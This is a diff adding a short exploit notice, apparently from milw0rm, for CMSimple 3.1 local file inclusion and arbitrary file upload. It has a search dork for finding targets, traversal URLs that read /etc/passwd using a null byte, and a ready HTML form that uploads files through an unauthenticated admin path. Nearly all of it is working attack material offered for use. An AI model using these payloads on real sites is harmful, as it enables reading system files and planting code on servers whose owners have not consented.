@@ -1,0 +1,27 @@
+<pre>
+#
+# CMSimple 3.1 Local File Inclusion / Arbitrary File Upload
+# download: http://www.cmsimple.org/?Downloads
+# dork: "Powered by CMSimple"
+#
+# author: irk4z@yahoo.pl
+# homepage: http://irk4z.wordpress.com
+#
+
+
+Local File Inclusion :
+
+	http://[host]/[path]/index.php?sl=[file]%00
+	http://[host]/[path]/index.php?sl=../../../../../../../etc/passwd%00
+
+
+Arbitrary File Upload (into http://[host]/[path]/downloads/ ):
+</pre>
+<form method="POST" enctype="multipart/form-data" action="http://[host]/[path]/index.php?sl=../adm&adm=1" >
+<input type="file" class="file" name="downloads" size="30">
+<input type="hidden" name="action" value="upload">
+<input type="hidden" name="function" value="downloads">
+<input type="submit" class="submit" value="Upload">
+</form>
+
+# milw0rm.com [2008-05-31]
